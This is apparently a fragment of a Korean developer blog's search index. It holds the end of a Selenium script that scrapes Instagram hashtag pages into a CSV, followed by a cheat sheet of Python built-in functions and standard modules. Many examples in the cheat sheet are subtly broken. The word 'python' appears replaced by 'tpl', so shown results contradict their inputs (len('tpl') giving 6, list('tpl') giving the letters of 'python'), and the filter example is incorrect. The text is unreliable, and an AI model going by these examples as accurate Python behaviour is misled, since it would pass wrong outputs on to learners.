soup1[\u0026#39;content\u0026#39;] reallink1 = reallink1[reallink1.find(\u0026#34;@\u0026#34;)+1:reallink1.find(\u0026#34;)\u0026#34;)] reallink1 = reallink1[:20] if reallink1 == \u0026#39;\u0026#39;: return #mylist.append(reallink1) for reallink2 in soup.find_all(\u0026#34;meta\u0026#34;,attrs={\u0026#34;property\u0026#34;:\u0026#34;instapp:hashtags\u0026#34;}): reallink2 = reallink2[\u0026#39;content\u0026#39;] reallink2 = reallink2[:10] mylist = [] mylist.append(reallink1) mylist.append(reallink2) frame.append(mylist) print(str(num)+\u0026#34;개의 데이터 저장 중\u0026#34;) num += 1 data = pd.DataFrame(frame) data.to_csv(\u0026#39;insta.csv\u0026#39;, mode=\u0026#39;a\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;,header=None) if __name__ == \u0026#39;__main__\u0026#39;: freeze_support() print(\u0026#34;#크롤링 속도는 컴퓨터 사양에 따라 1.0 ~ 2.5 값으로 설정해주세요.\u0026#34;) scrolltime = float(input(\u0026#34;크롤링 속도를 입력하세요 : \u0026#34;)) crawlnum = int(input(\u0026#34;가져올 데이터의 수를 입력하세요 : \u0026#34; )) search = input(\u0026#34;검색어를 입력하세요 : \u0026#34; ) search = urllib.parse.quote(search) url = \u0026#39;https://www.instagram.com/explore/tags/\u0026#39;+str(search)+\u0026#39;/\u0026#39; driver = webdriver.Chrome(\u0026#39;c:\\\\chromedriver.exe\u0026#39;) driver.get(url) sleep(5) SCROLL_PAUSE_TIME = scrolltime reallink = [] while True: pageString = driver.page_source bsObj = BeautifulSoup(pageString, \u0026#34;lxml\u0026#34;) for link1 in bsObj.find_all(name=\u0026#34;div\u0026#34;,attrs={\u0026#34;class\u0026#34;:\u0026#34;Nnq7C weEfm\u0026#34;}): title = link1.select(\u0026#39;a\u0026#39;)[0] real = title.attrs[\u0026#39;href\u0026#39;] reallink.append(real) title = link1.select(\u0026#39;a\u0026#39;)[1] real = title.attrs[\u0026#39;href\u0026#39;] reallink.append(real) title = link1.select(\u0026#39;a\u0026#39;)[2] real = title.attrs[\u0026#39;href\u0026#39;] reallink.append(real) last_height = driver.execute_script(\u0026#34;return document.body.scrollHeight\u0026#34;) driver.execute_script(\u0026#34;window.scrollTo(0, document.body.scrollHeight);\u0026#34;) sleep(SCROLL_PAUSE_TIME) new_height = driver.execute_script(\u0026#34;return document.body.scrollHeight\u0026#34;) if new_height == last_height: driver.execute_script(\u0026#34;window.scrollTo(0, document.body.scrollHeight);\u0026#34;) sleep(SCROLL_PAUSE_TIME) new_height = driver.execute_script(\u0026#34;return document.body.scrollHeight\u0026#34;) if new_height == last_height: break else: last_height = new_height continue reallinknum = len(reallink) print(\u0026#34;총\u0026#34;+str(reallinknum)+\u0026#34;개의 데이터를 받아왔습니다.\u0026#34;) p = Pool(5) p.map(f, reallink) p.close() p.join() print(\u0026#34;저장완료\u0026#34;) "}),a.add({id:36,href:'/docs/development/python/',title:"Python docs",content:"Python    Python docs   Python 정리\n  Code\n       Python Training   작성 중\n  작성 중\n    "}),a.add({id:37,href:'/docs/development/python/python/',title:"Python 정리",content:"python 내장함수 \r \r...\r\r\r\r\r\rabs abs(x)는 어떤 숫자를 입력받았을 때, 그 숫자의 절댓값을 돌려주는 함수\n\u0026gt;\u0026gt;\u0026gt; abs(3) 3 \u0026gt;\u0026gt;\u0026gt; abs(-3) 3    all all(x)는 반복 가능한(iterable) 자료형 x를 입력 인수로 받으며 이 x가 모두 참이면 True, 거짓이 하나라도 있으면 False를 반환\n※ 반복 가능한 자료형이란 for문으로 그 값을 출력할 수 있는 것을 의미한다. 리스트, 튜플, 문자열, 딕셔너리, 집합 등이 있다.\n\u0026gt;\u0026gt;\u0026gt; all([1, 2, 3]) True \u0026gt;\u0026gt;\u0026gt; all([1, 2, 3, 0]) False   any any(x)는 x 중 하나라도 참이 있으면 True를 돌려주고, x가 모두 거짓일 때에만 False를 돌려준다. all(x)의 반대이다.\n다음 예를 보자.\n\u0026gt;\u0026gt;\u0026gt; any([1, 2, 3, 0]) True \u0026gt;\u0026gt;\u0026gt; any([0, \u0026#34;\u0026#34;]) False   chr chr(i)는 아스키(ASCII) 코드 값을 입력받아 그 코드에 해당하는 문자를 출력하는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; chr(97) \u0026#39;a\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(48) \u0026#39;0\u0026#39;   dir dir은 객체가 자체적으로 가지고 있는 변수나 함수를 보여 준다. 다음 예는 리스트와 딕셔너리 객체 관련 함수(메서드)를 보여 주는 예이다. 우리가 02장에서 살펴본 자료형 관련 함수를 만나 볼 수 있다.\n\u0026gt;\u0026gt;\u0026gt; dir([1, 2, 3]) [\u0026#39;append\u0026#39;, \u0026#39;count\u0026#39;, \u0026#39;extend\u0026#39;, \u0026#39;index\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;pop\u0026#39;,...] \u0026gt;\u0026gt;\u0026gt; dir({\u0026#39;1\u0026#39;:\u0026#39;a\u0026#39;}) [\u0026#39;clear\u0026#39;, \u0026#39;copy\u0026#39;, \u0026#39;get\u0026#39;, \u0026#39;has_key\u0026#39;, \u0026#39;items\u0026#39;, \u0026#39;keys\u0026#39;,...] False   divmod divmod(a, b)는 2개의 숫자를 입력으로 받는다. 그리고 a를 b로 나눈 몫과 나머지를 튜플 형태로 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; divmod(7, 3) (2, 1)   enumerate enumerate는 \u0026ldquo;열거하다\u0026quot;라는 뜻이다. 이 함수는 순서가 있는 자료형(리스트, 튜플, 문자열)을 입력으로 받아 인덱스 값을 포함하는 enumerate 객체를 반환한다.\nfor i, name in enumerate([\u0026#39;body\u0026#39;, \u0026#39;foo\u0026#39;, \u0026#39;bar\u0026#39;]): print(i, name) 0 body 1 foo 2 bar   eval eval(expression )은 실행 가능한 문자열(1+2, \u0026lsquo;hi\u0026rsquo; + \u0026lsquo;a\u0026rsquo; 같은 것)을 입력으로 받아 문자열을 실행한 결괏값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; eval(\u0026#39;1+2\u0026#39;) 3 \u0026gt;\u0026gt;\u0026gt; eval(\u0026#34;\u0026#39;hi\u0026#39; + \u0026#39;a\u0026#39;\u0026#34;) \u0026#39;hia\u0026#39; \u0026gt;\u0026gt;\u0026gt; eval(\u0026#39;divmod(4, 3)\u0026#39;) (1, 1)   filter filter란 무엇인가를 걸러낸다는 뜻으로 filter 함수도 동일한 의미를 가진다.\nfilter 함수는 첫 번째 인수로 함수 이름을, 두 번째 인수로 그 함수에 차례로 들어갈 반복 가능한 자료형을 받는다. 그리고 두 번째 인수인 반복 가능한 자료형 요소가 첫 번째 인수인 함수에 입력되었을 때 반환 값이 참인 것만 묶어서(걸러 내서) 돌려준다.\ndef positive(Ex): result = [] for i in Ex: if i \u0026gt; 0: result.append(i) return result print(positive([1,-3,2,0,-5,6])) [1, 2, 6] print(list(filter(positive, [1, -3, 2, 0, -5, 6]))) [1, 2, 6]   hex hex(x)는 정수 값을 입력받아 16진수(hexadecimal)로 변환하여 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; hex(234) \u0026#39;0xea\u0026#39; \u0026gt;\u0026gt;\u0026gt; hex(3) \u0026#39;0x3\u0026#39;   id id(object)는 객체를 입력받아 객체의 고유 주소 값(레퍼런스)을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; a = 3 \u0026gt;\u0026gt;\u0026gt; id(3) 135072304   input input([prompt])은 사용자 입력을 받는 함수이다. 매개변수로 문자열을 주면 다음 세 번째 예에서 볼 수 있듯이 그 문자열은 프롬프트가 된다.\n\u0026gt;\u0026gt;\u0026gt; a = input() hi \u0026gt;\u0026gt;\u0026gt; a \u0026#39;hi\u0026#39;   int int(x)는 문자열 형태의 숫자나 소수점이 있는 숫자 등을 정수 형태로 돌려주는 함수로, 정수를 입력으로 받으면 그대로 돌려준다. int(x, radix)는 radix 진수로 표현된 문자열 x를 10진수로 변환하여 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; int(\u0026#39;3\u0026#39;) 3 \u0026gt;\u0026gt;\u0026gt; int(3.4) 3 # 2진수로 표현된 11의 10진수 값은 다음과 같이 구한다. \u0026gt;\u0026gt;\u0026gt; int(\u0026#39;11\u0026#39;, 2) 3 # 16진수로 표현된 1A의 10진수 값은 다음과 같이 구한다. \u0026gt;\u0026gt;\u0026gt; int(\u0026#39;1A\u0026#39;, 16) 26   isinstance isinstance(object, class )는 첫 번째 인수로 인스턴스, 두 번째 인수로 클래스 이름을 받는다. 입력으로 받은 인스턴스가 그 클래스의 인스턴스인지를 판단하여 참이면 True, 거짓이면 False를 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; class Person: pass ... \u0026gt;\u0026gt;\u0026gt; a = Person() \u0026gt;\u0026gt;\u0026gt; isinstance(a, Person) True # 위 예는 a가 Person 클래스가 만든 인스턴스임을 확인시켜 준다. \u0026gt;\u0026gt;\u0026gt; b = 3 \u0026gt;\u0026gt;\u0026gt; isinstance(b, Person) False # b는 Person 클래스가 만든 인스턴스가 아니므로 False를 돌려준다.   len len(s)은 입력값 s의 길이(요소의 전체 개수)를 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; len(\u0026#34;tpl\u0026#34;) 6 \u0026gt;\u0026gt;\u0026gt; len([1,2,3]) 3 \u0026gt;\u0026gt;\u0026gt; len((1, \u0026#39;a\u0026#39;)) 2 ***   list list(s)는 반복 가능한 자료형 s를 입력받아 리스트로 만들어 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; list(\u0026#34;tpl\u0026#34;) [\u0026#39;p\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] \u0026gt;\u0026gt;\u0026gt; list((1,2,3)) [1, 2, 3] # list 함수에 리스트를 입력으로 주면 똑같은 리스트를 복사하여 돌려준다. \u0026gt;\u0026gt;\u0026gt; a = [1, 2, 3] \u0026gt;\u0026gt;\u0026gt; b = list(a) \u0026gt;\u0026gt;\u0026gt; b [1, 2, 3]   map map(f, iterable)은 함수(f)와 반복 가능한(iterable) 자료형을 입력으로 받는다. map은 입력받은 자료형의 각 요소를 함수 f가 수행한 결과를 묶어서 돌려주는 함수이다.\n# two_times.py def two_times(numberList): result = [ ] for number in numberList: result.append(number*2) return result result = two_times([1, 2, 3, 4]) print(result) # two_times 함수는 리스트 요소를 입력받아 각 요소에 2를 곱한 결괏값을 돌려준다. 실행 결과는 다음과 같다. [2, 4, 6, 8] # 위 예제는 map 함수를 사용하면 다음처럼 바꿀 수 있다. \u0026gt;\u0026gt;\u0026gt; def two_times(x): ... return x*2 ... \u0026gt;\u0026gt;\u0026gt; list(map(two_times, [1, 2, 3, 4])) [2, 4, 6, 8] # 이제 앞 예제를 해석해 보자. 먼저 리스트의 첫 번째 요소인 1이 two_times 함수의 입력값으로 들어가고 1 * 2의 과정을 거쳐서 2가 된다. 다음으로 리스트의 두 번째 요소인 2가 2 * 2 의 과정을 거쳐 4가 된다. 따라서 결괏값 리스트는 이제 [2, 4]가 된다. 총 4개의 요솟값이 모두 수행되면 마지막으로 [2, 4, 6, 8]을 돌려준다. 이것이 map 함수가 하는 일이다. # 앞의 예는 lambda를 사용하면 다음처럼 간략하게 만들 수 있다. \u0026gt;\u0026gt;\u0026gt; list(map(lambda a: a*2, [1, 2, 3, 4])) [2, 4, 6, 8]   max max(iterable)는 인수로 반복 가능한 자료형을 입력받아 그 최댓값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; max([1, 2, 3]) 3 \u0026gt;\u0026gt;\u0026gt; max(\u0026#34;tpl\u0026#34;) \u0026#39;y\u0026#39;   min min(iterable)은 max 함수와 반대로, 인수로 반복 가능한 자료형을 입력받아 그 최솟값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; min([1, 2, 3]) 1 \u0026gt;\u0026gt;\u0026gt; min(\u0026#34;tpl\u0026#34;) \u0026#39;h\u0026#39;   oct oct(x)는 정수 형태의 숫자를 8진수 문자열로 바꾸어 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; oct(34) \u0026#39;0o42\u0026#39; \u0026gt;\u0026gt;\u0026gt; oct(12345) \u0026#39;0o30071\u0026#39;   open open(filename, [mode])은 \u0026ldquo;파일 이름\u0026quot;과 \u0026ldquo;읽기 방법\u0026quot;을 입력받아 파일 객체를 돌려주는 함수이다. 읽기 방법(mode)을 생략하면 기본값인 읽기 전용 모드(r)로 파일 객체를 만들어 돌려준다.\nmode	설명 w	쓰기 모드로 파일 열기 r	읽기 모드로 파일 열기 a	추가 모드로 파일 열기 b	바이너리 모드로 파일 열기 b는 w, r, a와 함께 사용한다.\n\u0026gt;\u0026gt;\u0026gt; f = open(\u0026#34;binary_file\u0026#34;, \u0026#34;rb\u0026#34;) # 위 예의 rb는 \u0026#34;바이너리 읽기 모드\u0026#34;를 의미한다. # 다음 예의 fread와 fread2는 동일한 방법이다. \u0026gt;\u0026gt;\u0026gt; fread = open(\u0026#34;read_mode.txt\u0026#34;, \u0026#39;r\u0026#39;) \u0026gt;\u0026gt;\u0026gt; fread2 = open(\u0026#34;read_mode.txt\u0026#34;) # 즉 모드 부분을 생략하면 기본값으로 읽기 모드 r를 갖게 된다. # 다음은 추가 모드(a)로 파일을 여는 예이다. \u0026gt;\u0026gt;\u0026gt; fappend = open(\u0026#34;append_mode.txt\u0026#34;, \u0026#39;a\u0026#39;)   ord ord(c)는 문자의 아스키 코드 값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;a\u0026#39;) 97 \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;0\u0026#39;) 48   pow pow(x, y)는 x의 y 제곱한 결괏값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; pow(2, 4) 16 \u0026gt;\u0026gt;\u0026gt; pow(3, 3) 27   range range([start,] stop [,step] )는 for문과 함께 자주 사용하는 함수이다. 이 함수는 입력받은 숫자에 해당하는 범위 값을 반복 가능한 객체로 만들어 돌려준다.\n# 시작 숫자를 지정해 주지 않으면 range 함수는 0부터 시작한다. \u0026gt;\u0026gt;\u0026gt; list(range(5)) [0, 1, 2, 3, 4] # 입력으로 주어지는 2개의 인수는 시작 숫자와 끝 숫자를 나타낸다. 단 끝 숫자는 해당 범위에 포함되지 않는다는 것에 주의하자. \u0026gt;\u0026gt;\u0026gt; list(range(5, 10)) [5, 6, 7, 8, 9] # 세 번째 인수는 숫자 사이의 거리를 말한다. \u0026gt;\u0026gt;\u0026gt; list(range(1, 10, 2)) [1, 3, 5, 7, 9] \u0026gt;\u0026gt;\u0026gt; list(range(0, -10, -1)) [0, -1, -2, -3, -4, -5, -6, -7, -8, -9]   round round(number[, ndigits]) 함수는 숫자를 입력받아 반올림해 주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; round(4.6) 5 \u0026gt;\u0026gt;\u0026gt; round(4.2) 4 \u0026gt;\u0026gt;\u0026gt; round(5.678, 2) 5.68 # round 함수의 두 번째 매개변수는 반올림하여 표시하고 싶은 소수점의 자릿수(ndigits)이다.   sorted sorted(iterable) 함수는 입력값을 정렬한 후 그 결과를 리스트로 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; sorted([3, 1, 2]) [1, 2, 3] \u0026gt;\u0026gt;\u0026gt; sorted([\u0026#39;a\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;b\u0026#39;]) [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;] \u0026gt;\u0026gt;\u0026gt; sorted(\u0026#34;zero\u0026#34;) [\u0026#39;e\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;z\u0026#39;] \u0026gt;\u0026gt;\u0026gt; sorted((3, 2, 1)) [1, 2, 3] # 리스트 자료형에도 sort 함수가 있다. 하지만 리스트 자료형의 sort 함수는 리스트 객체 그 자체를 정렬만 할 뿐 정렬된 결과를 돌려주지는 않는다.   str str(object)은 문자열 형태로 객체를 변환하여 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; str(3) \u0026#39;3\u0026#39; \u0026gt;\u0026gt;\u0026gt; str(\u0026#39;hi\u0026#39;) \u0026#39;hi\u0026#39; \u0026gt;\u0026gt;\u0026gt; str(\u0026#39;hi\u0026#39;.upper()) \u0026#39;HI\u0026#39;   sum sum(iterable) 은 입력받은 리스트나 튜플의 모든 요소의 합을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; sum([1,2,3]) 6 \u0026gt;\u0026gt;\u0026gt; sum((4,5,6)) 15   tuple tuple(iterable)은 반복 가능한 자료형을 입력받아 튜플 형태로 바꾸어 돌려주는 함수이다. 만약 튜플이 입력으로 들어오면 그대로 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; tuple(\u0026#34;abc\u0026#34;) (\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;) \u0026gt;\u0026gt;\u0026gt; tuple([1, 2, 3]) (1, 2, 3) \u0026gt;\u0026gt;\u0026gt; tuple((1, 2, 3)) (1, 2, 3)   type type(object)은 입력값의 자료형이 무엇인지 알려 주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; type(\u0026#34;abc\u0026#34;) \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; type([ ]) \u0026lt;class \u0026#39;list\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; type(open(\u0026#34;test\u0026#34;, \u0026#39;w\u0026#39;)) \u0026lt;class \u0026#39;_io.TextIOWrapper\u0026#39;\u0026gt;   zip zip(*iterable)은 동일한 개수로 이루어진 자료형을 묶어 주는 역할을 하는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; list(zip([1, 2, 3], [4, 5, 6])) [(1, 4), (2, 5), (3, 6)] \u0026gt;\u0026gt;\u0026gt; list(zip([1, 2, 3], [4, 5, 6], [7, 8, 9])) [(1, 4, 7), (2, 5, 8), (3, 6, 9)] \u0026gt;\u0026gt;\u0026gt; list(zip(\u0026#34;abc\u0026#34;, \u0026#34;def\u0026#34;)) [(\u0026#39;a\u0026#39;, \u0026#39;d\u0026#39;), (\u0026#39;b\u0026#39;, \u0026#39;e\u0026#39;), (\u0026#39;c\u0026#39;, \u0026#39;f\u0026#39;)]   sys sys 모듈은 파이썬 인터프리터가 제공하는 변수와 함수를 직접 제어할 수 있게 해주는 모듈이다.\n명령 행에서 인수 전달하기 - sys.argv\nC:/User/home\u0026gt;tpl test.py abc pey guido # 명령 프롬프트 창에서 위 예처럼 test.py 뒤에 또 다른 값을 함께 넣어 주면 sys.argv 리스트에 그 값이 추가된다. 예제를 따라 하며 확인해 보자. 우선 다음과 같은 파이썬 프로그램을 작성하자. argv_test.py 파일은 C:/doit/Mymod 디렉터리에 저장했다고 가정한다(만약 C:/doit/Mymod 디렉터리가 없다면 먼저 생성하고 진행하자).\nargv_test.py import sys print(sys.argv) 명령 프롬프트 창에서 Mymod 디렉터리로 들어간 뒤 다음과 같이 실행해 보자. C:/doit/Mymod\u0026gt;tpl argv_test.py you need tpl [\u0026#39;argv_test.py\u0026#39;, \u0026#39;you\u0026#39;, \u0026#39;need\u0026#39;, \u0026#39;tpl\u0026#39;] tpl 명령어 뒤의 모든 것들이 공백을 기준으로 나뉘어서 sys.argv 리스트의 요소가 된다. ※ 명령 프롬프트 창에서는 /, \\든 상관없지만, 소스코드 안에서는 반드시 / 또는 \\\\ 기호를 사용해야 한다. sys.exit 강제로 스크립트 종료\n\u0026gt;\u0026gt;\u0026gt; sys.exit() # sys.exit는 Ctrl+Z나 Ctrl+D를 눌러서 대화형 인터프리터를 종료하는 것과 같은 기능을 한다. 프로그램 파일 안에서 사용하면 프로그램을 중단시킨다. sys.path 자신이 만든 모듈 불러와 사용하기 sys.path는 파이썬 모듈들이 저장되어 있는 위치를 나타낸다. 즉 이 위치에 있는 파이썬 모듈은 경로에 상관없이 어디에서나 불러올 수 있다.\n\u0026gt;\u0026gt;\u0026gt; import sys \u0026gt;\u0026gt;\u0026gt; sys.path [\u0026#39;\u0026#39;, \u0026#39;C:\\\\Windows\\\\SYSTEM32\\\\tpl37.zip\u0026#39;, \u0026#39;c:\\\\tpl37\\\\DLLs\u0026#39;, \u0026#39;c:\\\\tpl37\\\\lib\u0026#39;, \u0026#39;c:\\\\tpl37\u0026#39;, \u0026#39;c:\\\\tpl37\\\\lib\\\\site-packages\u0026#39;] \u0026gt;\u0026gt;\u0026gt; # \u0026#39;\u0026#39; = 현재 디렉토리 path_append.py 파이썬 프로그램 파일에서 sys.path.append를 사용해 경로 이름을 추가할 수 있다. 이렇게 하고 난 후에는 C:/doit/Mymod 디렉터리에 있는 파이썬 모듈을 불러와서 사용할 수 있다.\nimport sys sys.path.append(\u0026#34;C:/doit/mymod\u0026#34;)   pickle pickle은 객체의 형태를 그대로 유지하면서 파일에 저장하고 불러올 수 있게 하는 모듈이다. 다음 예는 pickle 모듈의 dump 함수를 사용하여 딕셔너리 객체인 data를 그대로 파일에 저장하는 방법을 보여 준다.\n\u0026gt;\u0026gt;\u0026gt; import pickle \u0026gt;\u0026gt;\u0026gt; f = open(\u0026#34;test.txt\u0026#34;, \u0026#39;wb\u0026#39;) \u0026gt;\u0026gt;\u0026gt; data = {1: \u0026#39;tpl\u0026#39;, 2: \u0026#39;you need\u0026#39;} \u0026gt;\u0026gt;\u0026gt; pickle.dump(data, f) \u0026gt;\u0026gt;\u0026gt; f.close() # 다음은 pickle.dump로 저장한 파일을 pickle.load를 사용해서 원래 있던 딕셔너리 객체(data) 상태 그대로 불러오는 예이다. \u0026gt;\u0026gt;\u0026gt; import pickle \u0026gt;\u0026gt;\u0026gt; f = open(\u0026#34;test.txt\u0026#34;, \u0026#39;rb\u0026#39;) \u0026gt;\u0026gt;\u0026gt; data = pickle.load(f) \u0026gt;\u0026gt;\u0026gt; print(data) {2:\u0026#39;you need\u0026#39;, 1:\u0026#39;tpl\u0026#39;} # 위 예에서는 딕셔너리 객체를 사용했지만 어떤 자료형이든저장하고 불러올 수 있다.   os OS 모듈은 환경 변수나 디렉터리, 파일 등의 OS 자원을 제어할 수 있게 해주는 모듈이다.\nos.environ 시스템은 제각기 다른 환경 변수 값을 가지고 있는데, os.environ은 현재 시스템의 환경 변수 값을 보여 준다. 다음을 따라 해 보자.\n\u0026gt;\u0026gt;\u0026gt; import os \u0026gt;\u0026gt;\u0026gt; os.environ environ({\u0026#39;PROGRAMFILES\u0026#39;: \u0026#39;C:\\\\Program Files\u0026#39;, \u0026#39;APPDATA\u0026#39;: … 생략 …}) \u0026gt;\u0026gt;\u0026gt; # 위 결괏값은 필자의 시스템 정보이다. os.environ은 환경 변수에 대한 정보를 딕셔너리 객체로 돌려준다. 자세히 보면 여러 가지 유용한 정보를 찾을 수 있다. # 돌려받은 객체가 딕셔너리이기 때문에 다음과 같이 호출할 수 있다. 다음은 필자 시스템의 PATH 환경 변수 내용이다. \u0026gt;\u0026gt;\u0026gt; os.environ[\u0026#39;PATH\u0026#39;] \u0026#39;C:\\\\ProgramData\\\\Oracle\\\\Java\\\\javapath;...생략...\u0026#39; os.chdir os.chdir를 사용하면 다음과 같이 현재 디렉터리 위치를 변경할 수 있다.\n\u0026gt;\u0026gt;\u0026gt; os.chdir(\u0026#34;C:\\WINDOWS\u0026#34;) os.getcwd os.getcwd는 현재 자신의 디렉터리 위치를 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; os.getcwd() \u0026#39;C:\\WINDOWS\u0026#39; os.system 시스템 자체의 프로그램이나 기타 명령어를 파이썬에서 호출할 수도 있다. os.system(\u0026ldquo;명령어\u0026rdquo;)처럼 사용한다. 다음은 현재 디렉터리에서 시스템 명령어 dir을 실행하는 예이다.\n\u0026gt;\u0026gt;\u0026gt; os.system(\u0026#34;dir\u0026#34;) # 실행한 시스템 명령어의 결괏값 돌려받기 - os.popen os.popen os.popne은 시스템 명령어를 실행한 결괏값을 읽기 모드 형태의 파일 객체로 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; f = os.popen(\u0026#34;dir\u0026#34;) # 읽어 들인 파일 객체의 내용을 보기 위해서는 다음과 같이 하면 된다. \u0026gt;\u0026gt;\u0026gt; print(f.read()) 기타 유용한 os 관련 함수 함수	설명 os.mkdir(디렉터리)	디렉터리를 생성한다. os.rmdir(디렉터리)	디렉터리를 삭제한다.단, 디렉터리가 비어있어야 삭제가 가능하다. os.unlink(파일)	파일을 지운다. os.rename(src, dst)	src라는 이름의 파일을 dst라는 이름으로 바꾼다.\n  shutil shutil은 파일을 복사해 주는 파이썬 모듈이다.\n\u0026gt;\u0026gt;\u0026gt; import shutil \u0026gt;\u0026gt;\u0026gt; shutil.copy(\u0026#34;src.txt\u0026#34;, \u0026#34;dst.txt\u0026#34;) # 위 예를 실행해 보면 src.txt 파일과 동일한 내용의 파일이 dst.txt로 복사되는 것을 확인할 수 있다.   glob 가끔 파일을 읽고 쓰는 기능이 있는 프로그램을 만들다 보면 특정 디렉터리에 있는 파일 이름 모두를 알아야 할 때가 있다. 이럴 때 사용하는 모듈이 바로 glob이다.\n디렉터리에 있는 파일들을 리스트로 만들기 - glob(pathname)\nglob 모듈은 디렉터리 안의 파일들을 읽어서 돌려준다. *, ? 등 메타 문자를 써서 원하는 파일만 읽어 들일 수도 있다.\n다음은 C:/doit 디렉터리에 있는 파일 중 이름이 mark로 시작하는 파일을 모두 찾아서 읽어들이는 예이다.\n\u0026gt;\u0026gt;\u0026gt; import glob \u0026gt;\u0026gt;\u0026gt; glob.glob(\u0026#34;c:/doit/mark*\u0026#34;) [\u0026#39;c:/doit\\\\marks1.py\u0026#39;, \u0026#39;c:/doit\\\\marks2.py\u0026#39;, \u0026#39;c:/doit\\\\marks3.py\u0026#39;] \u0026gt;\u0026gt;\u0026gt;   tempfile 파일을 임시로 만들어서 사용할 때 유용한 모듈이 바로 tempfile이다. tempfile.mkstemp()는 중복되지 않는 임시 파일의 이름을 무작위로 만들어서 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; import tempfile \u0026gt;\u0026gt;\u0026gt; filename = tempfile.mkstemp() \u0026gt;\u0026gt;\u0026gt; filename \u0026#39;C:\\WINDOWS\\TEMP\\~-275151-0\u0026#39; tempfile.TemporaryFile()은 임시 저장 공간으로 사용할 파일 객체를 돌려준다. 이 파일은 기본적으로 바이너리 쓰기 모드(wb)를 갖는다. f.close()가 호출되면 이 파일 객체는 자동으로 사라진다. \u0026gt;\u0026gt;\u0026gt; import tempfile \u0026gt;\u0026gt;\u0026gt; f = tempfile.TemporaryFile() \u0026gt;\u0026gt;\u0026gt; f.close()   time 시간과 관련된 time 모듈에는 함수가 굉장히 많다. 그중 가장 유용한 몇 가지만 알아보자.\ntime.time time.time()은 UTC(Universal Time Coordinated 협정 세계 표준시)를 사용하여 현재 시간을 실수 형태로 돌려주는 함수이다. 1970년 1월 1일 0시 0분 0초를 기준으로 지난 시간을 초 단위로 돌려준다.\n   import time time.time() 988458015.73417199 time.localtime\n   time.localtime은 time.time()이 돌려준 실수 값을 사용해서 연도, 월, 일, 시, 분, 초, \u0026hellip; 의 형태로 바꾸어 주는 함수이다.\n   time.localtime(time.time()) time.struct_time(tm_year=2013, tm_mon=5, tm_mday=21, tm_hour=16, tm_min=48, tm_sec=42, tm_wday=1, tm_yday=141, tm_isdst=0) time.asctime\n   위 time.localtime에 의해서 반환된 튜플 형태의 값을 인수로 받아서 날짜와 시간을 알아보기 쉬운 형태로 돌려주는 함수이다.\n   time.asctime(time.localtime(time.time())) \u0026lsquo;Sat Apr 28 20:50:20 2001\u0026rsquo; time.ctime\n   time.asctime(time.localtime(time.time()))은 time.ctime()을 사용해 간편하게 표시할 수 있다. asctime과 다른 점은 ctime은 항상 현재 시간만을 돌려준다는 점이다.\n   time.ctime() \u0026lsquo;Sat Apr 28 20:56:31 2001\u0026rsquo; time.strftime\n   time.strftime(\u0026lsquo;출력할 형식 포맷 코드\u0026rsquo;, time.localtime(time.time())) strftime 함수는 시간에 관계된 것을 세밀하게 표현하는 여러 가지 포맷 코드를 제공한다.\n시간에 관계된 것을 표현하는 포맷 코드\n포맷코드	설명	예 %a	요일 줄임말	Mon %A	요일	Monday %b	달 줄임말	Jan %B	달	January %c	날짜와 시간을 출력함	06/01/01 17:22:21 %d	날(day)	[01,31] %H	시간(hour)-24시간 출력 형태	[00,23] %I	시간(hour)-12시간 출력 형태	[01,12] %j	1년 중 누적 날짜	[001,366] %m	달	[01,12] %M	분	[01,59] %p	AM or PM	AM %S	초	[00,59] %U	1년 중 누적 주-일요일을 시작으로	[00,53] %w	숫자로 된 요일	[0(일요일),6] %W	1년 중 누적 주-월요일을 시작으로	[00,53] %x	현재 설정된 로케일에 기반한 날짜 출력	06/01/01 %X	현재 설정된 로케일에 기반한 시간 출력	17:22:21 %Y	년도 출력	2001 %Z	시간대 출력	대한민국 표준시 %%	문자	% %y	세기부분을 제외한 년도 출력	01 다음은 time.strftime을 사용하는 예이다.\n   import time time.strftime('%x', time.localtime(time.time())) \u0026lsquo;05/01/01\u0026rsquo; time.strftime('%c', time.localtime(time.time())) \u0026lsquo;05/01/01 17:22:21\u0026rsquo; time.sleep\n   time.sleep 함수는 주로 루프 안에서 많이 사용한다. 이 함수를 사용하면 일정한 시간 간격을 두고 루프를 실행할 수 있다. 다음 예를 보자.\n#sleep1.py import time for i in range(10): print(i) time.sleep(1) 위 예는 1초 간격으로 0부터 9까지의 숫자를 